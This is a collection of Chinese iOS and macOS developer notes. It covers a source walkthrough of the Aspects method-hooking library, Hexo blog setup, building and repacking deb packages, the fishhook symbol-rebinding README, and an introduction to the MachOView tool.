小节一下:Aspects在hook之前会对传入的参数的合法性进行校验,然后把传入的block(就是在原方法调用之前,之后调用,或者替换原方法的代码块)和原方法都转换成方法签名进行对比,如果一致就把所有信息保存到AspectIdentifier这个类里面(后期调用这个block的时候会用到这些信息),然后会根据传进来的切面时机保存到AspectsContainer这个类里对应的数组中(最后通过遍历,获取到其中的一个AspectIdentifier对象,调用invokeWithInfo方法),准备工作做完以后开始对类和方法进行Hook操作了

二:Aspects是怎么对类和方法进行Hook的?
先对class进行hook再对selector进行hook

1.Hook Class
static Class aspect_hookClass(NSObject *self, NSError **error) {
    NSCParameterAssert(self);
    //获取类
    Class statedClass = self.class;
    //获取类的isa指针
    Class baseClass = object_getClass(self);
    
    NSString *className = NSStringFromClass(baseClass);

    // Already subclassed
    //判断是否包含_Aspects_,如果包含,就说明被hook过了,
    //如果不包含_Aspects_,再判断是不是元类,如果是元类调用aspect_swizzleClassInPlace
    //如果不包含_Aspects_,也不是元类,再判断statedClass和baseClass是否相等,如果不相等,说明是被kvo过的对象因为kvo对象的isa指针指向了另一个中间类,调用aspect_swizzleClassInPlace
    
    if ([className hasSuffix:AspectsSubclassSuffix]) {
        return baseClass;

        // We swizzle a class object, not a single object.
    }else if (class_isMetaClass(baseClass)) {
        return aspect_swizzleClassInPlace((Class)self);
        // Probably a KVO'ed class. Swizzle in place. Also swizzle meta classes in place.
    }else if (statedClass != baseClass) {
        return aspect_swizzleClassInPlace(baseClass);
    }

    // Default case. Create dynamic subclass.
    //如果不是元类,也不是被kvo过的类,也没有被hook过,就继续往下执行,创建一个子类,
    //拼接类名为XXX_Aspects_
    const char *subclassName = [className stringByAppendingString:AspectsSubclassSuffix].UTF8String;
    //根据拼接的类名获取类
    Class subclass = objc_getClass(subclassName);
    //如果上面获取到的了为nil
    if (subclass == nil) {
        //baseClass = MainViewController,创建一个子类MainViewController_Aspects_
        subclass = objc_allocateClassPair(baseClass, subclassName, 0);
        //如果子类创建失败,报错
        if (subclass == nil) {
            NSString *errrorDesc = [NSString stringWithFormat:@"objc_allocateClassPair failed to allocate class %s.", subclassName];
            AspectError(AspectErrorFailedToAllocateClassPair, errrorDesc);
            return nil;
        }

        aspect_swizzleForwardInvocation(subclass);
        //把subclass的isa指向了statedClass
        aspect_hookedGetClass(subclass, statedClass);
        //subclass的元类的isa，也指向了statedClass。
        aspect_hookedGetClass(object_getClass(subclass), statedClass);
        //注册刚刚新建的子类subclass，再调用object_setClass(self, subclass);把当前self的isa指向子类subclass
        objc_registerClassPair(subclass);
    }

    object_setClass(self, subclass);
    return subclass;
}
判断className中是否包含_Aspects_,如果包含就说明这个类已经被Hook过了直接返回这个类的isa指针
如果不包含判断在判断是不是元类,如果是就调用aspect_swizzleClassInPlace()
如果不包含也不是元类,再判断baseClass和statedClass是否相等,如果不相等,说明是被KVO过的对象
如果不是元类也不是被kvo过的类就继续向下执行,创建一个子类,类名为原来类名+_Aspects_,创建成功调用aspect_swizzleForwardInvocation()交换IMP,把新建类的forwardInvocationIMP替换为__ASPECTS_ARE_BEING_CALLED__,然后把subClass的isa指针指向statedCass,subclass的元类的isa指针也指向statedClass,然后注册新创建的子类subClass,再调用object_setClass(self, subclass);把当前self的isa指针指向子类subClass
aspect_swizzleClassInPlace()
static Class aspect_swizzleClassInPlace(Class klass) {
    NSCParameterAssert(klass);
    NSString *className = NSStringFromClass(klass);
    //创建无序集合
    _aspect_modifySwizzledClasses(^(NSMutableSet *swizzledClasses) {
        //如果集合中不包含className,添加到集合中
        if (![swizzledClasses containsObject:className]) {
            aspect_swizzleForwardInvocation(klass);
            [swizzledClasses addObject:className];
        }
    });
    return klass;
}
这个函数主要是:通过调用aspect_swizzleForwardInvocation ()函数把类的forwardInvocationIMP替换为__ASPECTS_ARE_BEING_CALLED__,然后把类名添加到集合中(这个集合后期删除Hook的时候会用到的)

aspect_swizzleForwardInvocation(Class klass)
static void aspect_swizzleForwardInvocation(Class klass) {
    NSCParameterAssert(klass);
    // If there is no method, replace will act like class_addMethod.
    //把forwardInvocation的IMP替换成__ASPECTS_ARE_BEING_CALLED__
    //class_replaceMethod返回的是原方法的IMP
    IMP originalImplementation = class_replaceMethod(klass, @selector(forwardInvocation:), (IMP)__ASPECTS_ARE_BEING_CALLED__, "v@:@");
   // originalImplementation不为空的话说明原方法有实现，添加一个新方法__aspects_forwardInvocation:指向了原来的originalImplementation，在__ASPECTS_ARE_BEING_CALLED__那里如果不能处理，判断是否有实现__aspects_forwardInvocation，有的话就转发。
 
    if (originalImplementation) {
        class_addMethod(klass, NSSelectorFromString(AspectsForwardInvocationSelectorName), originalImplementation, "v@:@");
    }
    AspectLog(@"Aspects: %@ is now aspect aware.", NSStringFromClass(klass));
}
交换方法实现IMP,把forwardInvocation:的IMP替换成__ASPECTS_ARE_BEING_CALLED__,这样做的目的是:在把selector进行hook以后会把原来的方法的IMP指向objc_forward,然后就会调用forwardInvocation :,因为forwardInvocation :的IMP指向的是__ASPECTS_ARE_BEING_CALLED__函数,最终就会调用到这里来,在这里面执行hook代码和原方法,如果原来的类有实现forwardInvocation :这个方法,就把这个方法的IMP指向__aspects_forwardInvocation:

aspect_hookedGetClass
static void aspect_hookedGetClass(Class class, Class statedClass) {
    NSCParameterAssert(class);
    NSCParameterAssert(statedClass);
    Method method = class_getInstanceMethod(class, @selector(class));
    IMP newIMP = imp_implementationWithBlock(^(id self) {
        return statedClass;
    });
    class_replaceMethod(class, @selector(class), newIMP, method_getTypeEncoding(method));
}
根据传递的参数,把新创建的类和该类的元类的class方法的IMP指向原来的类(以后新建的类再调用class方法,返回的都是statedClass)

object_setClass(self, subclass);
把原来类的isa指针指向新创建的类

接下来再说说是怎么对method进行hook的

static void aspect_prepareClassAndHookSelector(NSObject *self, SEL selector, NSError **error) {
    NSCParameterAssert(selector);
    Class klass = aspect_hookClass(self, error);
    Method targetMethod = class_getInstanceMethod(klass, selector);
    IMP targetMethodIMP = method_getImplementation(targetMethod);
    if (!aspect_isMsgForwardIMP(targetMethodIMP)) {
        // Make a method alias for the existing method implementation, it not already copied.
        const char *typeEncoding = method_getTypeEncoding(targetMethod);
        SEL aliasSelector = aspect_aliasForSelector(selector);
        //子类里面不能响应aspects_xxxx，就为klass添加aspects_xxxx方法，方法的实现为原生方法的实现
        if (![klass instancesRespondToSelector:aliasSelector]) {
            __unused BOOL addedAlias = class_addMethod(klass, aliasSelector, method_getImplementation(targetMethod), typeEncoding);
            NSCAssert(addedAlias, @"Original implementation for %@ is already copied to %@ on %@", NSStringFromSelector(selector), NSStringFromSelector(aliasSelector), klass);
        }

        // We use forwardInvocation to hook in.
        class_replaceMethod(klass, selector, aspect_getMsgForwardIMP(self, selector), typeEncoding);
        AspectLog(@"Aspects: Installed hook for -[%@ %@].", klass, NSStringFromSelector(selector));
    }
}
上面的代码主要是对selector进行hook,首先获取到原来的方法,然后判断判断是不是指向了_objc_msgForward,没有的话,就获取原来方法的方法编码,为新建的子类添加一个方法aspects__xxxxx,并将新建方法的IMP指向原来方法,再把原来类的方法的IMP指向_objc_msgForward,hook完毕

三:ASPECTS_ARE_BEING_CALLED
static void __ASPECTS_ARE_BEING_CALLED__(__unsafe_unretained NSObject *self, SEL selector, NSInvocation *invocation) {
    NSCParameterAssert(self);
    NSCParameterAssert(invocation);
    //获取原始的selector
    SEL originalSelector = invocation.selector;
    //获取带有aspects_xxxx前缀的方法
    SEL aliasSelector = aspect_aliasForSelector(invocation.selector);
    //替换selector
    invocation.selector = aliasSelector;
    //获取实例对象的容器objectContainer，这里是之前aspect_add关联过的对象
    AspectsContainer *objectContainer = objc_getAssociatedObject(self, aliasSelector);
    //获取获得类对象容器classContainer
    AspectsContainer *classContainer = aspect_getContainerForClass(object_getClass(self), aliasSelector);
    //初始化AspectInfo，传入self、invocation参数
    AspectInfo *info = [[AspectInfo alloc] initWithInstance:self invocation:invocation];
    NSArray *aspectsToRemove = nil;

    // Before hooks.
    //调用宏定义执行Aspects切片功能
    //宏定义里面就做了两件事情，一个是执行了[aspect invokeWithInfo:info]方法，一个是把需要remove的Aspects加入等待被移除的数组中。
    aspect_invoke(classContainer.beforeAspects, info);
    aspect_invoke(objectContainer.beforeAspects, info);

    // Instead hooks.
    BOOL respondsToAlias = YES;
    if (objectContainer.insteadAspects.count || classContainer.insteadAspects.count) {
        aspect_invoke(classContainer.insteadAspects, info);
        aspect_invoke(objectContainer.insteadAspects, info);
    }else {
        Class klass = object_getClass(invocation.target);
        do {
            if ((respondsToAlias = [klass instancesRespondToSelector:aliasSelector])) {
                [invocation invoke];
                break;
            }
        }while (!respondsToAlias && (klass = class_getSuperclass(klass)));
    }

    // After hooks.
    aspect_invoke(classContainer.afterAspects, info);
    aspect_invoke(objectContainer.afterAspects, info);

    // If no hooks are installed, call original implementation (usually to throw an exception)
    if (!respondsToAlias) {
        invocation.selector = originalSelector;
        SEL originalForwardInvocationSEL = NSSelectorFromString(AspectsForwardInvocationSelectorName);
        if ([self respondsToSelector:originalForwardInvocationSEL]) {
            ((void( *)(id, SEL, NSInvocation *))objc_msgSend)(self, originalForwardInvocationSEL, invocation);
        }else {
            [self doesNotRecognizeSelector:invocation.selector];
        }
    }

    // Remove any hooks that are queued for deregistration.
    [aspectsToRemove makeObjectsPerformSelector:@selector(remove)];
}
#define aspect_invoke(aspects, info) \
for (AspectIdentifier *aspect in aspects) {\
    [aspect invokeWithInfo:info];\
    if (aspect.options & AspectOptionAutomaticRemoval) { \
        aspectsToRemove = [aspectsToRemove?:@[] arrayByAddingObject:aspect]; \
    } \
}
- (BOOL)invokeWithInfo:(id<AspectInfo>)info {
    NSInvocation *blockInvocation = [NSInvocation invocationWithMethodSignature:self.blockSignature];
    NSInvocation *originalInvocation = info.originalInvocation;
    NSUInteger numberOfArguments = self.blockSignature.numberOfArguments;

    // Be extra paranoid. We already check that on hook registration.
    if (numberOfArguments > originalInvocation.methodSignature.numberOfArguments) {
        AspectLogError(@"Block has too many arguments. Not calling %@", info);
        return NO;
    }

    // The `self` of the block will be the AspectInfo. Optional.
    if (numberOfArguments > 1) {
        [blockInvocation setArgument:&info atIndex:1];
    }
    
    void *argBuf = NULL;
    //把originalInvocation中的参数
    for (NSUInteger idx = 2; idx < numberOfArguments; idx++) {
        const char *type = [originalInvocation.methodSignature getArgumentTypeAtIndex:idx];
        NSUInteger argSize;
        NSGetSizeAndAlignment(type, &argSize, NULL);
        
        if (!(argBuf = reallocf(argBuf, argSize))) {
            AspectLogError(@"Failed to allocate memory for block invocation.");
            return NO;
        }
        
        [originalInvocation getArgument:argBuf atIndex:idx];
        [blockInvocation setArgument:argBuf atIndex:idx];
    }
    
    [blockInvocation invokeWithTarget:self.block];
    
    if (argBuf != NULL) {
        free(argBuf);
    }
    return YES;
}
获取数据传递到aspect_invoke里面,调用invokeWithInfo,执行切面代码块,执行完代码块以后,获取到新创建的类,判断是否可以响应aspects__xxxx方法,现在aspects__xxxx方法指向的是原来方法实现的IMP,如果可以响应,就通过[invocation invoke];调用这个方法,如果不能响应就调用__aspects_forwardInvocation:这个方法,这个方法在hookClass的时候提到了,它的IMP指针指向了原来类中的forwardInvocation:实现,可以响应就去执行,不能响应就抛出异常doesNotRecognizeSelector;
整个流程差不多就这些,最后还有一个移除的操作

四:移除Aspects
- (BOOL)remove {
    return aspect_remove(self, NULL);
}
static BOOL aspect_remove(AspectIdentifier *aspect, NSError **error) {
    NSCAssert([aspect isKindOfClass:AspectIdentifier.class], @"Must have correct type.");

    __block BOOL success = NO;
    aspect_performLocked(^{
        id self = aspect.object; // strongify
        if (self) {
            AspectsContainer *aspectContainer = aspect_getContainerForObject(self, aspect.selector);
            success = [aspectContainer removeAspect:aspect];

            aspect_cleanupHookedClassAndSelector(self, aspect.selector);
            // destroy token
            aspect.object = nil;
            aspect.block = nil;
            aspect.selector = NULL;
        }else {
            NSString *errrorDesc = [NSString stringWithFormat:@"Unable to deregister hook. Object already deallocated: %@", aspect];
            AspectError(AspectErrorRemoveObjectAlreadyDeallocated, errrorDesc);
        }
    });
    return success;
}
调用remove方法,然后清空AspectsContainer里面的数据,调用aspect_cleanupHookedClassAndSelector清除更多的数据

// Will undo the runtime changes made.
static void aspect_cleanupHookedClassAndSelector(NSObject *self, SEL selector) {
    NSCParameterAssert(self);
    NSCParameterAssert(selector);

    Class klass = object_getClass(self);
    BOOL isMetaClass = class_isMetaClass(klass);
    if (isMetaClass) {
        klass = (Class)self;
    }

    // Check if the method is marked as forwarded and undo that.
    Method targetMethod = class_getInstanceMethod(klass, selector);
    IMP targetMethodIMP = method_getImplementation(targetMethod);
    //判断selector是不是指向了_objc_msgForward
    if (aspect_isMsgForwardIMP(targetMethodIMP)) {
        // Restore the original method implementation.
        //获取到方法编码
        const char *typeEncoding = method_getTypeEncoding(targetMethod);
        //拼接selector
        SEL aliasSelector = aspect_aliasForSelector(selector);
        Method originalMethod = class_getInstanceMethod(klass, aliasSelector);
        //获取新添加类中aspects__xxxx方法的IMP
        IMP originalIMP = method_getImplementation(originalMethod);
        NSCAssert(originalMethod, @"Original implementation for %@ not found %@ on %@", NSStringFromSelector(selector), NSStringFromSelector(aliasSelector), klass);
        //把aspects__xxxx方法的IMP指回元类类的方法
        class_replaceMethod(klass, selector, originalIMP, typeEncoding);
        AspectLog(@"Aspects: Removed hook for -[%@ %@].", klass, NSStringFromSelector(selector));
    }

    // Deregister global tracked selector
    aspect_deregisterTrackedSelector(self, selector);

    // Get the aspect container and check if there are any hooks remaining. Clean up if there are not.
    AspectsContainer *container = aspect_getContainerForObject(self, selector);
    if (!container.hasAspects) {
        // Destroy the container
        aspect_destroyContainerForObject(self, selector);

        // Figure out how the class was modified to undo the changes.
        NSString *className = NSStringFromClass(klass);
        if ([className hasSuffix:AspectsSubclassSuffix]) {
            Class originalClass = NSClassFromString([className stringByReplacingOccurrencesOfString:AspectsSubclassSuffix withString:@""]);
            NSCAssert(originalClass != nil, @"Original class must exist");
            object_setClass(self, originalClass);
            AspectLog(@"Aspects: %@ has been restored.", NSStringFromClass(originalClass));

            // We can only dispose the class pair if we can ensure that no instances exist using our subclass.
            // Since we don't globally track this, we can't ensure this - but there's also not much overhead in keeping it around.
            //objc_disposeClassPair(object.class);
        }else {
            // Class is most likely swizzled in place. Undo that.
            if (isMetaClass) {
                aspect_undoSwizzleClassInPlace((Class)self);
            }
        }
    }
}
上述代码主要做以下几件事:

1. 获取原来类的方法的IMP是不是指向了_objc_msgForward,如果是就把该方法的IMP再指回去
2. 如果是元类就删除swizzledClasses里面的数据
3. 把新建类的isa指针指向原来类, 其实就是把hook的时候做的处理,又还原了

# 搭建个人博客
## 什么是Hexo？
Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。

官方文档：https://hexo.io/zh-cn/docs/
1.安装Hexo
安装 Hexo 相当简单。然而在安装前，您必须检查电脑中是否已安装下列应用程序：

Node.js
Git
如果您的电脑中已经安装上述必备程序，那么恭喜您！接下来只需要使用 npm 即可完成 Hexo 的安装。
终端输入：(一定要加上sudo，否则会因为权限问题报错)
```
$ sudo npm install -g hexo-cli
```
终端输入：查看安装的版本，检查是否已安装成功！
```
$ hexo -v  // 显示 Hexo 版本
```
2.建站
安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。
```
// 新建空文件夹
$ cd /Users/renbo/Workspaces/BlogProject
// 初始化
$ hexo init 
$ npm install
```
新建完成后，指定文件夹的目录如下：

目录结构图

_config.yml：网站的 配置 信息，您可以在此配置大部分的参数。
scaffolds：模版 文件夹。当您新建文章（即新建markdown文件）时，Hexo 会根据 scaffold 来建立文件。
source：资源文件夹是存放用户资源（即markdown文件）的地方。
themes：主题 文件夹。Hexo 会根据主题来生成静态页面。

3.新建博客文章
新建一篇文章（即新建markdown文件）指令：
```
$ hexo new "文章标题"
```
4.生成静态文件
将文章markdown文件按指定格式生成静态网页文件
```
$ hexo g  // g 表示 generate ，是简写
```
5.部署网站
即将生成的网页文件上传到网站服务器（这里是上传到Github）。

上传之前可以先启动本地服务器（指令：hexo s ），在本地预览生成的网站。

默认本地预览网址：http://localhost:4000/
```
$ hexo s  // s 表示 server，是简写
```
部署网站指令：
```
$ hexo d  // d 表示 deploy，是简写
```
注意，如果报错： ERROR Deployer not found: git

需要我们再安装一个插件：
```
$ sudo npm install hexo-deployer-git --save
```
安装完插件之后再执行一下【hexo d】,它就会开始将public文件夹下的文件全部上传到你的gitHub仓库中。

6.清除文件
清除缓存文件 (db.json) 和已生成的静态文件 (public目录下的所有文件)。

清除指令：（一般是更改不生效时使用）
```
$ hexo clean
```
# deb包的解压,修改,重新打包方法

```
用dpkg命令制作deb包方法总结
如何制作Deb包和相应的软件仓库，其实这个很简单。这里推荐使用dpkg来进行deb包的创建、编辑和制作。

首先了解一下deb包的文件结构:

deb 软件包里面的结构：它具有DEBIAN和软件具体安装目录（如etc, usr, opt, tmp等）。在DEBIAN目录中起码具有control文件，其次还可能具有postinst(postinstallation)、postrm(postremove)、preinst(preinstallation)、prerm(preremove)、copyright (版权）、changlog （修订记录）和conffiles等。

control: 这个文件主要描述软件包的名称（Package），版本（Version）以及描述（Description）等，是deb包必须具备的描述性文件，以便于软件的安装管理和索引。同时为了能将软件包进行充分的管理，可能还具有以下字段:

Section: 这个字段申明软件的类别，常见的有`utils’, `net’, `mail’, `text’, `x11′ 等；

Priority: 这个字段申明软件对于系统的重要程度，如`required’, `standard’, `optional’, `extra’ 等；

Essential: 这个字段申明是否是系统最基本的软件包（选项为yes/no），如果是的话，这就表明该软件是维持系统稳定和正常运行的软件包，不允许任何形式的卸载（除非进行强制性的卸载）

Architecture:申明软件包结构，如基于`i386′, ‘amd64’,`m68k’, `sparc’, `alpha’, `powerpc’ 等；

Source: 软件包的源代码名称；

Depends: 软件所依赖的其他软件包和库文件。如果是依赖多个软件包和库文件，彼此之间采用逗号隔开；

Pre-Depends: 软件安装前必须安装、配置依赖性的软件包和库文件，它常常用于必须的预运行脚本需求；

Recommends: 这个字段表明推荐的安装的其他软件包和库文件；

Suggests: 建议安装的其他软件包和库文件。


对于control，这里有一个完整的例子:

Package: bioinfoserv-arb
Version: 2007_14_08
Section: BioInfoServ
Priority: optional
Depends: bioinfoserv-base-directories (>= 1.0-1), xviewg (>= 3.2p1.4), xfig (>= 1:3), libstdc++2.10-glibc2.2
Suggests: fig2ps
Architecture: i386
Installed-Size: 26104
Maintainer: Mingwei Liu <>
Provides: bioinfoserv-arb
Description: The ARB software is a graphically oriented package comprising various tools for sequence database handling and data analysis.
If you want to print your graphs you probably need to install the suggested fig2ps package.preinst: 这个文件是软件安装前所要进行的工作，工作执行会依据其中脚本进行；
postinst这个文件包含了软件在进行正常目录文件拷贝到系统后，所需要执行的配置工作。
prerm :软件卸载前需要执行的脚本
postrm: 软件卸载后需要执行的脚本现在来看看如何修订一个已有的deb包软件

=================================================================
debian制作DEB包(在root权限下），打包位置随意。
#建立要打包软件文件夹，如
mkdir Cydia
cd   Cydia

#依据程序的安装路径建立文件夹,并将相应程序添加到文件夹。如
mkdir Applications
mkdir var/mobile/Documents (游戏类需要这个目录，其他也有可能需要）
mkdir *** (要依据程序要求来添加）

#建立DEBIAN文件夹
mkdir DEBIAN


#在DEBIAN目录下创建一个control文件,并加入相关内容。
touch DEBIAN/control（也可以直接使用vi DEBIAN/control编辑保存）
#编辑control
vi DEBIAN/control

#相关内容（注意结尾必须空一行）：
Package: soft （程序名称）
Version: 1.0.1 （版本）
Section: utils （程序类别）
Architecture: iphoneos-arm   （程序格式）
Installed-Size: 512   （大小）
Maintainer: your <your_email@gmail.com>   （打包人和联系方式）
Description: soft package （程序说明)
                                       （此处必须空一行再结束）
注：此文件也可以先在电脑上编辑（使用文本编辑就可以，完成后去掉.txt),再传到打包目录里。

#在DEBIAN里还可以根据需要设置脚本文件
preinst
在Deb包文件解包之前，将会运行该脚本。许多“preinst”脚本的任务是停止作用于待升级软件包的服务，直到软件包安装或升级完成。

postinst
该脚本的主要任务是完成安装包时的配置工作。许多“postinst”脚本负责执行有关命令为新安装或升级的软件重启服务。

prerm
该脚本负责停止与软件包相关联的daemon服务。它在删除软件包关联文件之前执行。

postrm
该脚本负责修改软件包链接或文件关联，或删除由它创建的文件。

#postinst 如：
#!/bin/sh
if [ "$1" = "configure" ]; then
/Applications/MobileLog.app/MobileLog -install
/bin/launchctl load -wF /System/Library/LaunchDaemons/com.iXtension.MobileLogDaemon.plist 
fi

#prerm 如：
#!/bin/sh
if [[ $1 == remove ]]; then
/Applications/MobileLog.app/MobileLog -uninstall
/bin/launchctl unload -wF /System/Library/LaunchDaemons/com.iXtension.MobileLogDaemon.plist 
fi

#如果DEBIAN目录中含有postinst 、prerm等执行文件
chmod -R 755 DEBIAN

#退出打包软件文件夹，生成DEB
dpkg-deb --build Cydia
=====================================================================
有时候安装自己打包的deb包时报如下错误：
Selecting previously deselected package initrd-deb.
(Reading database ... 71153 files and directories currently installed.)
Unpacking initrd-deb (from initrd-vstools_1.0_amd64.deb) ...
dpkg: error processing initrd-vstools_1.0_amd64.deb (--install):
trying to overwrite `/boot/initrd-vstools.img', which is also in package initrd-deb-2
dpkg-deb: subprocess paste killed by signal (Broken pipe)
Errors were encountered while processing:
initrd-vstools_1.0_amd64.deb
主要意思是说，已经有一个deb已经安装了相同的文件，所以默认退出安装，只要把原来安装的文件给卸载掉，再次进行安装就可以了。

下面为实践内容：

所有的目录以及文件：

mydeb

|----DEBIAN

       |-------control
               |-------postinst

       |-------postrm

|----boot

       |----- initrd-vstools.img

在任意目录下创建如上所示的目录以及文件
# mkdir   -p /root/mydeb                          # 在该目录下存放生成deb包的文件以及目录
# mkdir -p /root/mydeb/DEBIAN           #目录名必须大写
# mkdir -p /root/mydeb/boot                   # 将文件安装到/boot目录下
# touch /root/mydeb/DEBIAN/control    # 必须要有该文件
# touch /root/mydeb/DEBIAN/postinst # 软件安装完后，执行该Shell脚本
# touch /root/mydeb/DEBIAN/postrm    # 软件卸载后，执行该Shell脚本
# touch /root/mydeb/boot/initrd-vstools.img    # 所谓的“软件”程序，这里就只是一个空文件


control文件内容：
Package: my-deb   （软件名称，中间不能有空格）
Version: 1                  (软件版本)
Section: utils            （软件类别）
Priority: optional        （软件对于系统的重要程度）
Architecture: amd64   （软件所支持的平台架构）
Maintainer: xxxxxx <> （打包人和联系方式）
Description: my first deb （对软件所的描述）

postinst文件内容（ 软件安装完后，执行该Shell脚本，一般用来配置软件执行环境，必须以“#!/bin/sh”为首行，然后给该脚本赋予可执行权限：chmod +x postinst）：
#!/bin/sh
echo "my deb" > /root/mydeb.log

postrm文件内容（ 软件卸载后，执行该Shell脚本，一般作为清理收尾工作，必须以“#!/bin/sh”为首行，然后给该脚本赋予可执行权限：chmod +x postrm）：
#!/bin/sh
rm -rf /root/mydeb.log

给mydeb目录打包：
# dpkg -b   mydeb   mydeb-1.deb      # 第一个参数为将要打包的目录名，
                                                            # 第二个参数为生成包的名称。

安装deb包：
# dpkg -i   mydeb-1.deb      # 将initrd-vstools.img复制到/boot目录下后，执行postinst，
                                            # postinst脚本在/root目录下生成一个含有"my deb"字符的mydeb.log文件

卸载deb包：
# dpkg -r   my-deb      # 这里要卸载的包名为control文件Package字段所定义的 my-deb 。
                                    # 将/boot目录下initrd-vstools.img删除后，执行posrm，
                                    # postrm脚本将/root目录下的mydeb.log文件删除

查看deb包是否安装：
# dpkg -s   my-deb      # 这里要卸载的包名为control文件Package字段所定义的 my-deb

查看deb包文件内容：
# dpkg   -c   mydeb-1.deb

查看当前目录某个deb包的信息：
# dpkg --info mydeb-1.deb

解压deb包中所要安装的文件
# dpkg -x   mydeb-1.deb   mydeb-1    # 第一个参数为所要解压的deb包，这里为 mydeb-1.deb
                                                             # 第二个参数为将deb包解压到指定的目录，这里为 mydeb-1

解压deb包中DEBIAN目录下的文件（至少包含control文件）
# dpkg -e   mydeb-1.deb   mydeb-1/DEBIAN    # 第一个参数为所要解压的deb包，
                                                                           # 这里为 mydeb-1.deb
                                                                          # 第二个参数为将deb包解压到指定的目录，
                                                                           # 这里为 mydeb-1/DEBIAN
                                                                        
```
## mac上 使用dpkg命令

## 1: 先 安装 Macports
```
https://www.macports.org/install.php
```

## 2: 安装 dpkg

```
sudo port -f install dpkg
```

```
1、准备工作：
    mkdir -p extract/DEBIAN
    mkdir build

2、解包命令为：
    #解压出包中的文件到extract目录下
    dpkg -X ../openssh-xxx.deb extract/
    #解压出包的控制信息extract/DEBIAN/下：
    dpkg -e ../openssh-xxx.deb extract/DEBIAN/
3、修改文件:
    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' extract/etc/ssh/sshd_config
4、对修改后的内容重新进行打包生成deb包
    dpkg-deb -b extract/ build/
```

# fishhook

### 相关资料
[fishhook源码分析](http://turingh.github.io/2016/03/22/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/)

[mach-o格式介绍](http://turingh.github.io/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/)

[mach-o延时绑定](http://turingh.github.io/2016/03/10/Mach-O%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/)

以下是官方内容
===
__fishhook__ is a very simple library that enables dynamically rebinding symbols in Mach-O binaries running on iOS in the simulator and on device. This provides functionality that is similar to using [`DYLD_INTERPOSE`][interpose] on OS X. At Facebook, we've found it useful as a way to hook calls in libSystem for debugging/tracing purposes (for example, auditing for double-close issues with file descriptors).

[interpose]: http://opensource.apple.com/source/dyld/dyld-210.2.3/include/mach-o/dyld-interposing.h    "<mach-o/dyld-interposing.h>"

## Usage

Once you add `fishhook.h`/`fishhook.c` to your project, you can rebind symbols as follows:
```Objective-C
#import <dlfcn.h>

#import <UIKit/UIKit.h>

#import "AppDelegate.h"
#import "fishhook.h"

static int (*orig_close)(int);
static int (*orig_open)(const char *, int, ...);

int my_close(int fd) {
  printf("Calling real close(%d)\n", fd);
  return orig_close(fd);
}

int my_open(const char *path, int oflag, ...) {
  va_list ap = {0};
  mode_t mode = 0;

  if ((oflag & O_CREAT) != 0) {
    // mode only applies to O_CREAT
    va_start(ap, oflag);
    mode = va_arg(ap, int);
    va_end(ap);
    printf("Calling real open('%s', %d, %d)\n", path, oflag, mode);
    return orig_open(path, oflag, mode);
  } else {
    printf("Calling real open('%s', %d)\n", path, oflag);
    return orig_open(path, oflag, mode);
  }
}

int main(int argc, char * argv[])
{
  @autoreleasepool {
    rebind_symbols((struct rebinding[2]){{"close", my_close, (void *)&orig_close}, {"open", my_open, (void *)&orig_open}}, 2);

    // Open our own binary and print out first 4 bytes (which is the same
    // for all Mach-O binaries on a given architecture)
    int fd = open(argv[0], O_RDONLY);
    uint32_t magic_number = 0;
    read(fd, &magic_number, 4);
    printf("Mach-O Magic Number: %x \n", magic_number);
    close(fd);

    return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
  }
}
```
### Sample output
```
Calling real open('/var/mobile/Applications/161DA598-5B83-41F5-8A44-675491AF6A2C/Test.app/Test', 0)
Mach-O Magic Number: feedface 
Calling real close(3)
...
```

## How it works

`dyld` binds lazy and non-lazy symbols by updating pointers in particular sections of the `__DATA` segment of a Mach-O binary. __fishhook__ re-binds these symbols by determining the locations to update for each of the symbol names passed to `rebind_symbols` and then writing out the corresponding replacements.

For a given image, the `__DATA` segment may contain two sections that are relevant for dynamic symbol bindings: `__nl_symbol_ptr` and `__la_symbol_ptr`. `__nl_symbol_ptr` is an array of pointers to non-lazily bound data (these are bound at the time a library is loaded) and `__la_symbol_ptr` is an array of pointers to imported functions that is generally filled by a routine called `dyld_stub_binder` during the first call to that symbol (it's also possible to tell `dyld` to bind these at launch). In order to find the name of the symbol that corresponds to a particular location in one of these sections, we have to jump through several layers of indirection. For the two relevant sections, the section headers (`struct section`s from `<mach-o/loader.h>`) provide an offset (in the `reserved1` field) into what is known as the indirect symbol table. The indirect symbol table, which is located in the `__LINKEDIT` segment of the binary, is just an array of indexes into the symbol table (also in `__LINKEDIT`) whose order is identical to that of the pointers in the non-lazy and lazy symbol sections. So, given `struct section nl_symbol_ptr`, the corresponding index in the symbol table of the first address in that section is `indirect_symbol_table[nl_symbol_ptr->reserved1]`. The symbol table itself is an array of `struct nlist`s (see `<mach-o/nlist.h>`), and each `nlist` contains an index into the string table in `__LINKEDIT` which where the actual symbol names are stored. So, for each pointer `__nl_symbol_ptr` and `__la_symbol_ptr`, we are able to find the corresponding symbol and then the corresponding string to compare against the requested symbol names, and if there is a match, we replace the pointer in the section with the replacement.

The process of looking up the name of a given entry in the lazy or non-lazy pointer tables looks like this:
![Visual explanation](http://i.imgur.com/HVXqHCz.png)



# MachOView

源码地址：https://github.com/gdbinit/MachOView

Mach-O格式全称为Mach Object文件格式的缩写，是mac上可执行文件的格式，类似于windows上的PE格式 (Portable Executable ), linux上的elf格式 (Executable and Linking Format)。

mach-o文件类型分为：
```
1、Executable：应用的主要二进制

2、Dylib Library：动态链接库（又称DSO或DLL）

3、Static Library：静态链接库

4、Bundle：不能被链接的Dylib，只能在运行时使用dlopen( )加载，可当做macOS的插件

5、Relocatable Object File ：可重定向文件类型
```
## 那什么又是FatFile/FatBinary？

简单来说，就是一个由不同的编译架构后的Mach-O产物所合成的集合体。一个架构的mach-O只能在相同架构的机器或者模拟器上用，为了支持不同架构需要一个集合体。

一、使用方式
1、MachOView工具概述

MachOView工具可Mac平台中可查看MachO文件格式信息，IOS系统中可执行程序属于Mach-O文件格式，有必要介绍如何利用工具快速查看Mach-O文件格式。

点击“MachOView”之后，便在Mac系统左上角出现MachOView工具的操作菜单

